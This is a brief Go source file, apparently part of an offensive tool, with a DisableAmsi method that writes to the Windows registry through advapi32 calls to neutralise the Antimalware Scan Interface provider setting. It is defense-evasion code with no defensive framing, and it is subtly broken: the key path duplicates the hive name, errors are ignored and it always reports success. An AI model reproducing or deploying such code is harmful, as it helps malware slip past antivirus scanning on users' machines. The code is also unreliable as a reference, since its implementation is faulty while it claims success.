package amsi_etw

import (
"syscall"
"unsafe"
)

type RegistryDisable struct{}

func NewRegistryDisable() *RegistryDisable {
return &RegistryDisable{}
}

func (r *RegistryDisable) DisableAmsi() error {
advapi32 := syscall.NewLazyDLL("advapi32.dll")
procRegOpenKeyEx := advapi32.NewProc("RegOpenKeyExW")
procRegSetValueEx := advapi32.NewProc("RegSetValueExW")

keyPath, _ := syscall.UTF16PtrFromString("HKEY_CURRENT_USER\\Software\\Microsoft\\AMSI\\Providers")
var hKey uintptr
procRegOpenKeyEx.Call(
uintptr(0x80000001), // HKEY_CURRENT_USER
uintptr(unsafe.Pointer(keyPath)),
0,
0x20006,
uintptr(unsafe.Pointer(&hKey)),
)

valueName, _ := syscall.UTF16PtrFromString("Provider")
valueData := []byte{0x00}
procRegSetValueEx.Call(
hKey,
uintptr(unsafe.Pointer(valueName)),
0,
0x1,
uintptr(unsafe.Pointer(&valueData[0])),
1,
)

return nil
}
